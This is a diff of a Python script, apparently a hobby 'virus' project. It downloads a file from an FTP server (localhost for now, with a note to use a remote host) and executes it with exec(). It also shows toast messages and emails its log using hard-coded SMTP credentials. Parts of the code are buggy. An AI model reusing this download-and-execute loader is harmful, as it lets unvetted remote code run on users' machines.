@@ -2,6 +2,8 @@ import sys
 from ftplib import FTP
 from datetime import datetime
 import time
+from zipfile import ZipFile, ZIP_DEFLATED
+
 from win10toast import ToastNotifier
 from random import *
 import logging
@@ -9,26 +11,27 @@ import smtplib
 from email.message import EmailMessage
 from email.utils import make_msgid
 
-# The time to wait in seconds before executing the script
 WAIT_TIME = 5
+"""The time to wait in seconds before executing the script"""
 
-# The name of the log file
 LOGFILE_NAME = 'netter_virus_logs.log'
+"""The name of the log file"""
 
-# The chance for each run of a notification being sent to the user in percent
-NOTIFICATION_CHANCE = 80
+NOTIFICATION_CHANCE = 20
+"""The chance for each run of a notification being sent to the user in percent"""
 
-# The list of potentially useful things to tell the user
 # TODO: Expand the list with more things
 USER_TELL_STRINGS = [
+
     'Don\'t forget to drink Water.',
     'Never gonna give you up...',
     'The first bug was a literal bug that crawled into a computer system.'
 ]
+"""The list of potentially useful things to tell the user"""
 
 
-# Connect to the FTP server
 def ftp_connect():
+    """Connect to the FTP server and return the connection"""
     logging.debug('Connecting to server...')
     ftp = FTP('localhost')  # TODO: Replace address with fixed remote host address
     # Login to the FTP server as anonymous user
@@ -36,21 +39,21 @@ def ftp_connect():
     return ftp
 
 
-# Download the new file from the FTP server
 def ftp_download(ftp):
+    """Download the new file from the FTP server"""
     # Create the unique name under which the new file is to be stored based on the current date and time
-    filename = datetime.now().strftime("%d-%M-%Y_%H-%M-%S") + '.py'
-    logging.info(f'Downloading file as {filename}')
+    filename = datetime.now().strftime("%d-%M-%Y_%H-%M-%S")
+    logging.info(f'Downloading file as {filename}.py')
     # Download the file and store it
-    with open(f'{filename}', 'wb') as fp:
+    with open(f'{filename}.py', 'wb') as fp:
         logging.debug(ftp.retrbinary(f'RETR main.py', fp.write))
     return filename
 
 
-# Say something potentially useful to the user
 def tell_user():
+    """Say something potentially useful to the user taken from the USER_TELL_STRINGS list"""
     # To prevent spamming the user with notifications, there is only a 20% chance for one to be shown each run
-    if randint(1, 100) >= NOTIFICATION_CHANCE:
+    if randint(1, 100) <= NOTIFICATION_CHANCE:
         logging.info('Saying something to the user:')
         # Select a random string from the list
         notification_text = USER_TELL_STRINGS[randint(0, len(USER_TELL_STRINGS) - 1)]
@@ -61,8 +64,8 @@ def tell_user():
         notification.show_toast('Attention please', notification_text, duration=3)
 
 
-# Send an email about the current status, which includes the log file
 def send_email():
+    """Send an email about the current status, which includes the log file"""
     logging.debug('Sending mail about status')
     # Define sender and recipient of the email
     sender = "Private Person <from@example.com>"
@@ -78,15 +81,24 @@ def send_email():
     # Add the logfile to the email as attachment
     with open(LOGFILE_NAME) as fp:
         message.add_attachment(fp.read())
+    # Send the email
     with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
-        server.login("36438686bce063", "4954bd17d86bb6")
+        server.login("36438686bce063", "4954bd17d86bb6")  # TODO: Use a proper email service to actually send the email
         server.sendmail(sender, receiver, message.as_bytes())
 
 
-# Execute the previously downloaded file
-def execute_file(filename):
+def zip_logfile(filename: str):
+    """Store a copy of the log file in a ZIP file with the same name as the last downloaded python file"""
+    logging.debug('Zipping logfile')
+    # Create a new ZIP file and copy the current log file into it
+    with ZipFile(f'{filename}.zip', mode='w', compression=ZIP_DEFLATED) as z:
+        z.write(f'{LOGFILE_NAME}.log')
+
+
+def execute_file(filename: str):
+    """Execute the previously downloaded file"""
     logging.debug(f'Opening and executing file {filename}')
-    exec(open(f'{filename}').read())
+    exec(open(f'{filename}.py').read())
 
 
 if __name__ == '__main__':
@@ -104,6 +116,7 @@ if __name__ == '__main__':
         logging.debug(f'Entering wait duration of {WAIT_TIME} seconds...')
         time.sleep(WAIT_TIME)
         # Continue with the execution
+        zip_logfile(name)
         execute_file(name)
     except:
         # If any exception occurs, the program is to log it and exit
